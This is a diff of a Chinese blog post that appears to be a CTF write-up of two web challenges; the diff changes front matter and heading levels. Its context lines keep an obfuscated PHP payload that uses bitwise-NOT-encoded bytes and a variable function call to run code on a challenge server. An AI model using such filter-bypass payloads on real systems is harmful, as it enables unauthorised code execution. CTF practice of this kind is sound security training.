@@ -1,18 +1,16 @@
 ---
 title: "广东强网杯两道Web Writeup"
 date: 2019-09-12T09:06:02+08:00
-lastmod: 2019-09-12T09:06:02+08:00
 draft: false
 tags: ['ctf']
 categories: ['CTF笔记']
-comment: true
 ---
 
 @level5师傅发在群里的题目，做了两道
 
 <!--more-->
 
-# web4 php
+## web4 php
 
 http://119.61.19.212:8082/index.php
 
@@ -76,7 +74,7 @@ $%E4%B8%AD=~(%B8%9A%8B%A6%90%8A%8D%B9%93%9E%98);$%E4%B8%AD();
 view-source:http://119.61.19.212:8082/index.php?code=$%E4%B8%AD=~(%B8%9A%8B%A6%90%8A%8D%B9%93%9E%98);$%E4%B8%AD();
 ```
 
-# web5
+## web5
 
 laravel的代码审计
 
